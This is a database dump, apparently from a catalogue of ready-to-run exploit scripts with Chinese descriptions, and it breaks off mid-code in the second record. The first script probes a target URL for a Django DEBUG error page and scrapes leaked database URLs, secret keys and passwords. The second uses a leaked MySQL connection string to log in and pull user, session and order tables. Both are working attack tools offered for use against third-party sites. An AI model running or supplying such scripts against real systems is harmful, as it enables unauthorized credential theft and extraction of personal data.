-[ RECORD 1 ]--+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
id             | 1
name           | django-debug-true-exploit
description    | 自動化分析目標是否啟用 Django DEBUG=True，並提取錯誤頁面中的敏感資訊（如資料庫連線字串、密鑰、環境變數等）。
instructions   | 1. 執行腳本：`python django_debug_true_exploit.py --target <目標URL>`                                                                                                                +
               | 2. 腳本會自動發送 GET 請求，檢查是否有 Django 錯誤頁面。                                                                                                                             +
               | 3. 如發現 DEBUG=True，會提取敏感資訊（如資料庫連線字串、密鑰等）。                                                                                                                   +
               | 4. 輸出結果會顯示外洩的敏感資訊，並提醒管理員進行修復。
script_content | import requests                                                                                                                                                                      +
               | from bs4 import BeautifulSoup                                                                                                                                                        +
               | import re                                                                                                                                                                            +
               | import argparse                                                                                                                                                                      +
               |                                                                                                                                                                                      +
               | def check_django_debug_true(target_url):                                                                                                                                             +
               |     """                                                                                                                                                                              +
               |     檢查目標是否啟用 Django DEBUG=True，並提取敏感資訊。                                                                                                                             +
               |     """                                                                                                                                                                              +
               |     try:                                                                                                                                                                             +
               |         # 發送 GET 請求                                                                                                                                                              +
               |         response = requests.get(target_url, timeout=10)                                                                                                                              +
               |         soup = BeautifulSoup(response.text, 'html.parser')                                                                                                                           +
               |                                                                                                                                                                                      +
               |         # 檢查是否有 Django 錯誤頁面                                                                                                                                                 +
               |         if "DEBUG = True" in response.text or "Django" in response.text:                                                                                                             +
               |             print("✅ 目標可能啟用 Django DEBUG=True")                                                                                                                               +
               |                                                                                                                                                                                      +
               |             # 提取資料庫連線字串                                                                                                                                                     +
               |             db_pattern = re.compile(r"DATABASE_URL=([^\s]+)")                                                                                                                        +
               |             db_match = db_pattern.search(response.text)                                                                                                                              +
               |             if db_match:                                                                                                                                                             +
               |                 print(f"🔴 資料庫連線字串外洩: {db_match.group(1)}")                                                                                                                 +
               |                 return db_match.group(1)                                                                                                                                             +
               |                                                                                                                                                                                      +
               |             # 提取 Django 密鑰                                                                                                                                                       +
               |             secret_key_pattern = re.compile(r"SECRET_KEY=([^\s]+)")                                                                                                                  +
               |             secret_key_match = secret_key_pattern.search(response.text)                                                                                                              +
               |             if secret_key_match:                                                                                                                                                     +
               |                 print(f"🔴 Django Secret Key 外洩: {secret_key_match.group(1)}")                                                                                                     +
               |                 return secret_key_match.group(1)                                                                                                                                     +
               |                                                                                                                                                                                      +
               |             # 提取其他敏感資訊                                                                                                                                                       +
               |             sensitive_patterns = [                                                                                                                                                   +
               |                 r"HOST: ([^\s]+)",                                                                                                                                                   +
               |                 r"USER: ([^\s]+)",                                                                                                                                                   +
               |                 r"PASSWORD: ([^\s]+)",                                                                                                                                               +
               |                 r"PORT: ([^\d]+)",                                                                                                                                                   +
               |             ]                                                                                                                                                                        +
               |             for pattern in sensitive_patterns:                                                                                                                                       +
               |                 match = re.search(pattern, response.text)                                                                                                                            +
               |                 if match:                                                                                                                                                            +
               |                     print(f"🔴 敏感資訊外洩: {match.group(1)}")                                                                                                                      +
               |                     return match.group(1)                                                                                                                                            +
               |                                                                                                                                                                                      +
               |         else:                                                                                                                                                                        +
               |             print("❌ 目標未啟用 Django DEBUG=True 或未發現錯誤頁面")                                                                                                                +
               |             return None                                                                                                                                                              +
               |                                                                                                                                                                                      +
               |     except Exception as e:                                                                                                                                                           +
               |         print(f"❌ 請求失敗: {e}")                                                                                                                                                   +
               |         return None                                                                                                                                                                  +
               |                                                                                                                                                                                      +
               | if __name__ == "__main__":                                                                                                                                                           +
               |     parser = argparse.ArgumentParser(description="檢查目標是否啟用 Django DEBUG=True，並提取敏感資訊")                                                                               +
               |     parser.add_argument("--target", required=True, help="目標 URL")                                                                                                                  +
               |     args = parser.parse_args()                                                                                                                                                       +
               |     check_django_debug_true(args.target)
language       | python
tags           | ["django", "debug", "sensitive-data-leak", "error-page"]
usage_count    | 0
created_at     | 2026-05-08 14:59:29.289032+00
updated_at     | 2026-05-08 14:59:29.289043+00
-[ RECORD 2 ]--+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
id             | 2
name           | mysql-connection-string-exploit
description    | 自動化連接外洩的 MySQL 資料庫，並提取敏感資料（如使用者資料、Session、訂單等）。
instructions   | 1. 執行腳本：`python mysql_connection_string_exploit.py --connection-string <外洩的MySQL連線字串>`                                                                                   +
               | 2. 腳本會自動解析連線字串，並嘗試連接資料庫。                                                                                                                                        +
               | 3. 如連接成功，會列出所有資料表，並提取敏感資料（如 auth_user、django_session 等）。                                                                                                 +
               | 4. 輸出結果會顯示提取的敏感資料，並提醒管理員進行修復。
script_content | import mysql.connector                                                                                                                                                               +
               | import argparse                                                                                                                                                                      +
               | import re                                                                                                                                                                            +
               |                                                                                                                                                                                      +
               | def extract_db_info_from_url(db_url):                                                                                                                                                +
               |     """                                                                                                                                                                              +
               |     從 MySQL 連線字串中提取資料庫資訊。                                                                                                                                              +
               |     """                                                                                                                                                                              +
               |     pattern = r"mysql://([^:]+):([^@]+)@([^:]+):(\d+)/([^\s]+)"                                                                                                                      +
               |     match = re.match(pattern, db_url)                                                                                                                                                +
               |     if match:                                                                                                                                                                        +
               |         return {                                                                                                                                                                     +
               |             "user": match.group(1),                                                                                                                                                  +
               |             "password": match.group(2),                                                                                                                                              +
               |             "host": match.group(3),                                                                                                                                                  +
               |             "port": match.group(4),                                                                                                                                                  +
               |             "database": match.group(5),                                                                                                                                              +
               |         }                                                                                                                                                                            +
               |     return None                                                                                                                                                                      +
               |                                                                                                                                                                                      +
               | def connect_and_extract_data(db_info):                                                                                                                                               +
               |     """                                                                                                                                                                              +
               |     連接 MySQL 資料庫，並提取敏感資料。                                                                                                                                              +
               |     """                                                                                                                                                                              +
               |     try:                                                                                                                                                                             +
               |         conn = mysql.connector.connect(                                                                                                                                              +
               |             host=db_info["host"],                                                                                                                                                    +
               |             port=int(db_info["port"]),                                                                                                                                               +
               |             user=db_info["user"],                                                                                                                                                    +
